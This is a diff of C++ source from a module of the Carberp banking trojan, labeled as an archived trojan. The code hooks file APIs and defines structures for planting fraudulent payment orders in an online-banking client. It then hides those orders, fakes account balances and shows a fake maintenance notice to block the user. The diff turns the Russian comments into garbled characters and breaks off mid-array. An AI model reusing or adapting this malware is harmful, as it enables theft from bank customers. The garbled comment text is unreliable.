@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -27,9 +38,9 @@ namespace DBGRAFADLL
 
 #define DBGRAFA DBGRAFADLL::DBGOutMessage<>
 
-#define RafaDllModule //говорим что модуль включен
+#define RafaDllModule //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//не нужно проводить аз
+//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
 //#define TEST_NOTAZ
 
 namespace Rafa
@@ -43,21 +54,21 @@ HANDLE (WINAPI *pHandlerCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, D
 BOOL (WINAPI *pHandlerCloseHandle)(HANDLE hObject);
 BOOL (WINAPI *pHandlerWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 
-WNDPROC MainWndProc; //оконная процедура главного окна клиента
-WNDPROC PaymentWndProc; //оконная процедура окна ввода платежки
+WNDPROC MainWndProc; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+WNDPROC PaymentWndProc; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//контрол формы, для автоматического заполнения формы данными
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct ControlForm
 {
-	const char* name; //условное имя контрола, для его идентификации в программе
-	int x, y, w, h; //расположение контрола на форме (для поиска, изменять нельзя)
+	const char* name; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	int x, y, w, h; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ)
 	const char* captionText;
-	DWORD captionHash; //если хеш не указан, то ищем по captionText
+	DWORD captionHash; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ captionText
 	const char* classText;
 	DWORD classHash;
 };
 
-//информация он найденном контроле
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct ControlFinded
 {
 	HWND wnd;
@@ -66,145 +77,145 @@ struct ControlFinded
 
 struct PaymentOrder
 {
-	char* sendAcc; //счет отправителя
-	char* sum; //сумма
+	char* sendAcc; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char* sum; //пїЅпїЅпїЅпїЅпїЅ
 	char* inn;
 	char* kpp;
 	char* bik;
-	char* recvAcc; //счет получателя
-	char* recvName; //название получателя
-	char* comment; //назначение платежа
+	char* recvAcc; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char* recvName; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char* comment; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char* nds;
-	char* bankName; //наименование банка получателя
-	char* bankCity; //город банка получателя
-	char* bankAcc; //счет банка получателя
-	bool entered; //платежка проведена (введена)
-	char* balans; //баланс на время создания платежки, указатель всегда должен быть в конце
-	char  reserve[32]; //запас на будущее расширение
-	char  mem[1024]; //память для данных, сюда ссылаются указатели выше
+	char* bankName; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char* bankCity; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char* bankAcc; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	bool entered; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
+	char* balans; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
+	char  reserve[32]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char  mem[1024]; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 };
 
-//найденный счет и его баланс
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 struct AccountBalans
 {
-	char acc[24]; //найденный счет
-	char balans[24]; //остаток на счету
-	char showBalans[24]; //отображаемый баланс (с добавлением введенных платежек), который нужно подставлять
+	char acc[24]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	char balans[24]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	char showBalans[24]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ), пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-//найденный аккаунт в дереве
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 struct TreeAccount
 {
-	char acc[24]; //номер счета
-	HTREEITEM itemAcc; //ветка счета
-	HTREEITEM itemTmpls; //ветка шаблонов
+	char acc[24]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	HTREEITEM itemAcc; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	HTREEITEM itemTmpls; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-//типы отчетов рафы
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 enum TypeFileReport
 {
 	ReportNothing,
-	ReportInfoOperaions, //справка по операциям
-	ReportTxt, //пока неизвестный текстовый файл
-	ReportXml, //пока неизвестный xml файл
-	ReportFormatClientBank, //экспорт для клиент-банка
-	ReportFormat1C, //экспорт для 1C
-	ReportFormatXml //экспорт в xml формате
+	ReportInfoOperaions, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	ReportTxt, //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	ReportXml, //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ xml пїЅпїЅпїЅпїЅ
+	ReportFormatClientBank, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅ
+	ReportFormat1C, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ 1C
+	ReportFormatXml //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ xml пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-//Отчет формируемый рафой
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 struct FileReport
 {
-	HANDLE file; //файл отчета
-	TypeFileReport type; //тип отчета
-	char* text; //загруженный отчет, размер выделенной памяти на 1 больше, для последнего 0
-	int len; //длина отчета
+	HANDLE file; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	TypeFileReport type; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	char* text; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 1 пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0
+	int len; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
 static void GrabBalansFromMemoText(char* s);
 static void GrabBalansFromLVM( int cln, char* s );
-static void LoadPaymentOrders(); //загрузка проведенных платежек из файла, чтобы их потом скрывать
-static void SavePaymentOrders(); //сохранение платежек
-static PaymentOrder* GetPaymentOrders(); //запрос новой платежки в админке
-static void DBGPrintPayment( PaymentOrder* po ); //печать переданной (считанной) платежки для дебага
-static void RelocPayment( char* base ); //перерасчитывает адреса в массиве paymentOrders после перевыделения памяти или загрузки из файла
+static void LoadPaymentOrders(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static void SavePaymentOrders(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static PaymentOrder* GetPaymentOrders(); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static void DBGPrintPayment( PaymentOrder* po ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+static void RelocPayment( char* base ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ paymentOrders пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static int BalansToInt( const char* s, int format = 0 );
 static char* IntToBalans( int v, char* s, int format = 0 );
 static bool FindTreeList();
 
-HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
-DWORD PID = 0; //для избежания 2-го запуска
-char LVM_Acc[32]; //найденный счет в таблице
-int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabBalansFromLVM)
+HWND IEWnd = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+DWORD PID = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+char LVM_Acc[32]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+int fromLVM = 0;  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 1, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ GrabBalansFromLVM)
 HWND treeView = 0, listView = 0, toolBar = 0;
 int idBtNewDoc = 0;
-int idBtDelivery = 0; //кнопка на тулбаре Доставка
-bool offBtDelivery = false; //отключить кнопку Доставка, нужно показывать диалог о профилактике
+int idBtDelivery = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+bool offBtDelivery = false; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 POINT posBtNewDoc, posBtDelivery;
 int stateFakeWindow = 0;
-PaymentOrder* paymentOrders = 0; //платежные поручения
-int c_paymentOrders = 0; //количество скрываемых (полученных) платежек
-AccountBalans findedBalans[8]; //найденный счета с балансами
-int c_findedBalans = 0; //количество найденных счетов
-const char* prophylaxisText = "На данный момент это функцию выполнить невозможно, так как на сервере проводятся профилактические работы. "
-							  "Попробуйте через некоторое время.\nИзвините за доставленные неудобства.";
+PaymentOrder* paymentOrders = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+int c_paymentOrders = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+AccountBalans findedBalans[8]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+int c_findedBalans = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+const char* prophylaxisText = "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. "
+							  "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.";
 
-//переменные для скрытия платежек
-int paramRows[400]; //каждая строка содержит параметр по которому извлекаются данные (не по номеру), поэтому для скрытия храним и этот параметр
-int c_lvRows = 0; //количество строк в lvRows, определяется по сообщению LVM_INSERTITEM
-int begHideRows = 0; //с какой строки начинаются невидимые строки
-int identHidePayment = 0; //флаги: 1 - совпал получатель, 2 - совпала сумма, 4 - совпало назначение
-const int fullIdent = 1 + 2 + 4; //при этом значении считаем, что наша платежка идентифицирована
-char filePayments[MAX_PATH]; //файл в котором храним инфу о сформированных платежках
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+int paramRows[400]; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ), пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+int c_lvRows = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ lvRows, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ LVM_INSERTITEM
+int begHideRows = 0; //пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+int identHidePayment = 0; //пїЅпїЅпїЅпїЅпїЅ: 1 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 2 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, 4 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+const int fullIdent = 1 + 2 + 4; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+char filePayments[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-int retMenuNds = 0; //возвращаемое значение при выборе меню НДС
+int retMenuNds = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 
 int widthScreen, heightScreen;
 
-//список формируемых отчетов, расчитываем на несколько одновременно формируемых, 
-//но на самом деле должен формироваться только один
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 
+//пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 const int maxFileReports = 5;
 FileReport fileReports[maxFileReports];
 
-//char domain[128]; //адрес админки
+//char domain[128]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//контролы формы "Платежное поручение"
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ"
 ControlForm controlsPaymentOrder[] = 
 {
-	{ "form",	 0, 0, 606, 569,  "Платёжное поручение", 0x505B8A7A, "Canvas",  0 },
-	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //номер документа
-	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* срочный */, 0, 0x5E9D34F9 /* button */}, //галочка срочный
-	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //дата
-	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //вид платежа
-	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //статус составителя
-	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //ИНН плательщика
-	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП плательщика
-	{ "namesend", 93, 133, 234, 25, 0,                   0,          0,         0xCB934F4 /* edit */}, //название плательщика
-	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //сумма
-	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* НДС */, 0, 0x5E9D34F9 /* button */}, //кнопка НДС
-	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //ИНН получателя
-	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП получателя
-	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //счет получателя
-	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //наименование получателя
-	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //БИК получателя
-	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //банк получателя
-	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //счет банка получателя
-	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //населенный пункт получателя
-	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //дата исполнения
-	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //очередь платежа
-	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //назначение платежа
-	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* Сохранить */, 0, 0x5E9D34F9 /* button */}, //кнопка сохранить
-	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* К отправке */, 0, 0x5E9D34F9 /* button */}, //галочка к отправке
+	{ "form",	 0, 0, 606, 569,  "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0x505B8A7A, "Canvas",  0 },
+	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅ */, 0, 0x5E9D34F9 /* button */}, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //пїЅпїЅпїЅпїЅ
+	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
